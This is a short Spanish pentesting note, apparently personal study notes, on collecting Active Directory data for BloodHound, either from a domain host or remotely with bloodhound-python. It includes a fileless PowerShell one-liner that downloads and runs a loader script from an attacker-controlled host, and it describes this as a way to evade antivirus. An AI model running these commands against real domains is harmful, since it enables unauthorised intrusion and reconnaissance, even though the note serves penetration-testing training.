Para que BloodHound funcione es necesario cargarle un conjunto de archivos, tenemos dos formas de obtener estos archivos, una es de forma remota, y la otra es con acceso a una maquina del dominio, recordar que para ambas de estas opciones es necesario tener credenciales validas de algún usuario del dominio (no tiene que ser administrador del dominio)
## Con acceso a la maquina

Primeramente tenemos que tener SharpLoader.ps1, vamos a hacer un ataque de tipo fileless que nos va a permitir cargar el script de recolección de datos en la maquina sin que el AV (Anti Virus) no ponga problema:

Iniciaremos un servidor http desde nuestra maquina usando python (mas rapido):

```python
sudo python -m http.server 1234
```

Ahora, con el siguiente comando se va a descargar y ejecutar automáticamente el script SharpLoader.ps1: 

```powershell
IEX (New-Object Net.WebClient).downloadString('http://{IP_ATACANTE}/SharpLoader.ps1')
```

Para una mayor explicación revisar [[Ejecuciones fileless]]

Ahora ejecutaremos el siguiente comando

```python
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\adam.scott\Documents\
```

![[Pasted image 20260416204415.png]]

Esto nos deberia dejar un archivo .zip en el directorio actual, nos lo moveremos a nuestra maquina de atacantes y se lo pasaremos a BloodHound

## Sin acceso a la maquina

En este caso, no tenemos acceso directo a una maquina pero si a un usuario y contraseña validos, por lo que vamos a ahcer uso de la herramienta bloohound-python, recomiendo que sea ejecutada en una carpeta vacia ya que suelta bastantes archivos y luego tenemos que seleccionarlos todos en bloodhound, la sintaxis del comando seria la siguiente:

```python
bloodhound-python -u {Usuario} -ns [IP_DC] -d [DOMINIO] -p {Contraseña} -c All 
```

Esto nos pondrá un montón de archivos json que tendremos que subir a bloodhound.